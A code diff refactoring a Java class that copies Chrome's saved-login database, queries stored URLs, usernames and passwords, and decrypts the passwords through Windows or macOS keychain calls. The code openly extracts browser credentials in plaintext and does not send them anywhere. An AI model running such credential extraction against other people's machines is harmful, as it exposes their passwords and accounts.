@@ -23,28 +23,30 @@ public class ChromeDatabase {
     private static final Logger LOG = Logger.getLogger(ChromeDatabase.class.getName());
 
     public static ChromeDatabase connect(final File database) throws IOException {
-        Path tempDB;
         try {
-            tempDB = Files.createTempFile("CHROME_LOGIN_", null);
+            Path tempDB = Files.createTempFile("CHROME_LOGIN_", null);
             final FileOutputStream out = new FileOutputStream(tempDB.toFile());
             Files.copy(Paths.get(database.getPath()), out);
             out.close();
             tempDB.toFile().deleteOnExit();
+            return new ChromeDatabase(initConnection(tempDB.toString()));
         } catch (final IOException e) {
             throw new IOException("Error copying database! Does the login file exist?");
         }
-        Connection db;
+    }
+
+    private static Connection initConnection(String dbPath) throws IOException {
         try {
+            Connection db;
             final SQLiteConfig config = new SQLiteConfig();
             config.setReadOnly(true);
-
             config.setTransactionMode(TransactionMode.EXCLUSIVE);
-            db = config.createConnection("jdbc:sqlite:" + tempDB.toString());
+            db = config.createConnection("jdbc:sqlite:" + dbPath);
             db.setAutoCommit(true);
+            return db;
         } catch (final SQLException e) {
             throw new IOException("Error connecting to database! Is database corrupted?");
         }
-        return new ChromeDatabase(db);
     }
 
     private final Connection connection;
@@ -74,20 +76,10 @@ public class ChromeDatabase {
             final String loginQuery = "SELECT action_url, username_value, password_value FROM logins";
             final ResultSet results = connection.createStatement().executeQuery(loginQuery);
             while (results.next()) {
-                String address, username, password;
                 try {
-                    address = results.getString("action_url");
-                    username = results.getString("username_value");
-                    switch (OperatingSystem.getOperatingSystem()) {
-                        case WINDOWS:
-                            password = ChromeSecurity.getWin32Password(results.getBytes("password_value"));
-                            break;
-                        case MAC:
-                            password = ChromeSecurity.getOSXKeychainPasswordAsAdmin(address);
-                            break;
-                        default:
-                            throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
-                    }
+                    String address = results.getString("action_url");
+                    String username = results.getString("username_value");
+                    String password = getPassword(results);
                     accounts.add(new ChromeAccount(username, password, address));
                 } catch (final SQLException e) {
                     LOG.log(Level.SEVERE, e.getMessage(), e);
@@ -99,5 +91,20 @@ public class ChromeDatabase {
             throw new IOException("Error reading database. Is the file corrupted?");
         }
         return accounts;
+    }
+
+    private String getPassword(ResultSet results) throws Exception {
+        String password;
+        switch (OperatingSystem.getOperatingSystem()) {
+            case WINDOWS:
+                password = ChromeSecurity.getWin32Password(results.getBytes("password_value"));
+                break;
+            case MAC:
+                password = ChromeSecurity.getOSXKeychainPasswordAsAdmin(results.getString("action_url"));
+                break;
+            default:
+                throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
+        }
+        return password;
     }
 }
